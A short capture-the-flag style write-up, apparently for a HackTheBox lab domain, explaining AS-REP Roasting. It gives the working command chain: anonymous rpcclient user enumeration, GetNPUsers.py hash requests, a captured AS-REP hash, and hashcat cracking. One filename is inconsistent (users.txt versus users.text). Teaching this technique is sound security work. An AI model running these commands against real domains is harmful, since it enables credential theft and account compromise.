# AS-REP Roasting
AS-REP Roasting is a Kerberos-based attack that targets domain accounts configured without pre-authentication. When this setting is disabled, an attacker can request an Authentication Service Response (AS-REP) for a user without providing valid credentials.

First, domain users were enumerated anonymously via SMB using rpcclient, and the usernames were extracted into a file.
```
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" | awk -F'[][]' '{print $2}' > users.txt
```
Next, GetNPUsers.py was used to identify accounts with the DONT_REQUIRE_PREAUTH flag enabled. For vulnerable accounts, the Domain Controller returned an AS-REP hash.
```
GetNPUsers.py htb.local/ -usersfile users.text -dc-ip 10.129.95.210 -no-pass
```
This hash ($krb5asrep$23) uses RC4-HMAC encryption and can be cracked offline without interacting further with the Domain Controller. Finally, hashcat was used with mode 18200 to perform a dictionary attack and recover the plaintext password.
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:cd2a8f3b7979eab6bb774d2c6642db04$78dfe257e2884f91e1de18779d932f26b454d61f2ca125ceb9fcd9bd160ba7e2b06e8bebfed1ab55a9b384b683d452bfb1a0646caa7aa90d6b5e1fe09f90a49e3fb09b9150673270e59e83b513e572e60f1c669df69a2ab956f6285c7d805f476c1c0f1c5955cade45fa01af32fdb97fb3b5feeddbf263641f874b27cb89f1ab418a2c729cdef65666de7ebdb641192288021ed8898f2b12b8f70bc2e137a7e28cb84e35484c3608a07a7318c7fdab3cd9b8723499b19c92903b1098327c35736c52da0056bb2a8ca55bd2d33d74f7bb1052a6c95e677934711eaaa738ab5c5a619df84472df
```

```
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
